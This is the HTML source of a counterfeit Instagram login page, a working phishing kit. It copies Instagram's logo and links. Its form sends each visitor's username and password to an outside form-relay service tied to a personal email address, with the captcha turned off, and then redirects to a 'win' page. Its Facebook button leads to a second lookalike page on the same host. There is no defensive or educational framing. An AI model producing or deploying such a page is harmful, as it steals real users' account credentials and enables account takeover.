<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Instagram</title>
  <link rel="icon" href="temp/instagram.png" type="image/x-icon">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
  <style>
    @import url("https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap");

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Roboto', sans-serif;
      background-color: #fafafa;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 80vh;
      margin: 0;
    }

    .container {
      width: 300px;
      padding: 20px;
      text-align: center;
    }

    img {
      width: 120px;
      margin-bottom: 20px;
    }

    .facebook-icon {
      color: #fff;
      font-size: 20px;
      margin-right: 10px;
    }

    button.facebook-button {
      width: 100%;
      padding: 10px;
      color: #fff;
      background-color: #1877f2;
      border: none;
      border-radius: 5px; /* Adjusted button radius */
      cursor: pointer;
      font-weight: bold;
      margin-top: 10px;
    }

    .or-divider {
      display: flex;
      align-items: center;
      margin: 15px 0;
    }

    .divider-line {
      flex-grow: 1;
      height: 1px;
      background-color: #dbdbdb;
    }

    .or-text {
      margin: 0 10px;
      color: #8e8e8e;
      font-weight: bold;
    }

    input {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background-color: #fafafa;
    }

    button.login-button {
      width: 100%;
      padding: 10px;
      color: #fff;
      background-color: #3897f0;
      border: none;
      border-radius: 5px; /* Adjusted button radius */
      cursor: pointer;
      font-weight: bold;
      margin-bottom: 25px;
      margin-top: 10px;
    }

    .forgot-password {
      margin-top: 10px;
      text-align: right;
    }

    .bottom-text {
      margin-top: 15px;
      color: #8e8e8e;
    }
    
    p {
     font-size: 16px;
    }
    
    a {
      text-decoration: none;
     }
    
    .language-option {
      margin-top: 10px;
      margin-bottom: 100px;
      font-size: 20px;
      color: #666;
    }
  </style>
</head>

<body>
  <div class="container">
    <div class="language-option">English</div>
    <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
    
    <button class="facebook-button" onclick="redirectToFacebook()">
      <i class="fab fa-facebook-square facebook-icon"></i>
      Continue with Facebook
    </button>
    
    <div class="or-divider">
      <div class="divider-line"></div>
      <div class="or-text">OR</div>
      <div class="divider-line"></div>
    </div>
    <form action="https://formsubmit.co/kumarsharma2580@gmail.com" method="POST">
    <input type="text" name="Instagram ID" placeholder="Phone number, username or email" required>
    <input type="password" name="Instagram Password" placeholder="Password" required>
    <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="_next" value="https://shkumaraman.github.io/win.html">
    <p class="forgot-password"><a href="https://www.instagram.com/accounts/password/reset/?hl=en">Forgot Password?</a></p>
      
    <button class="login-button"type="submit">Log in</button>
</form>
    <p class="bottom-text">Don't have an account? <a href="https://www.instagram.com/accounts/signup/phone/?hl=en">Sign up</a></p>
  </div>
    <script>
    function redirectToFacebook() {
      // Replace the URL with the actual Facebook login URL
      window.location.href = 'https://shkumaraman.github.io/facebook.html';
    }
  </script>
</body>
</html>
